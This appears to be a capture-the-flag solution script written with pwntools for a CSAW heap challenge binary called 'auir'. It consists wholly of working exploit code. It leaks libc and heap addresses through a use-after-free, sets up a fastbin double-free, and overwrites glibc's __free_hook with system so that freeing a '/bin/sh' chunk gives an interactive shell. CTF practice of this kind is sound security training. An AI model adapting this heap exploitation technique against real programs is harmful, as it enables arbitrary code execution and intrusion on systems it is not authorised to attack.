from pwn import *

os.environ['LD_PRELOAD'] = './libc-2.23.so'
e = ELF('./auir')
libc = ELF('./libc-2.23.so')
local = 1
buf = 0x605310
count = 0x605630
if local:
    r = process('./auir')
else:
    r = remote('pwn.chal.csaw.io', 7713)

def add(l, skill):
    r.sendline('1')
    r.sendline(str(l))
    r.send(skill)
    r.clean()

def delete(index):
    r.sendline('2')
    r.sendline(str(index))
    r.clean()

def display(index):
    r.sendline('4')
    r.sendline(str(index))
    r.recvuntil('[*]SHOWING....\n')

def edit(index, l, skill):
    r.sendline('3')
    r.sendline(str(index))
    r.sendline(str(l))
    r.send(skill)
    r.clean()

# leak libc
add(256, 'AAAAAAAA')
add(0x50, 'BBBBBBBB')
add(0x50, 'CCCCCCCC')
delete(0)
display(0)
libc_base = u64(r.recv(8)) - libc.symbols['__malloc_hook']-88-16
log.info('libc base: %#x' % libc_base)

# heap overwrite to double free
delete(2)
delete(1)
display(1)
heap = u64(r.recv(8))
log.info('heap addr: %#x' % heap)
edit(1, 0x80, p64(heap)+'\x00'*0x50+p64(0x61)+p64(heap-0x60))

# overwrite free
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

target = __free_hook-0xb00-6+0x80
log.info('free hook: %#x' % __free_hook)
log.info('system: %#x' % system)
add(0x50, p64(target))
add(0x50, '/bin/sh\x00')
add(0x50, '/bin/sh\x00')
add(0x50, '/bin/sh\x00')
edit(6, 0xb00, '\x00'*2678+p64(system))
delete(3)
r.sendline('ls')
r.interactive()

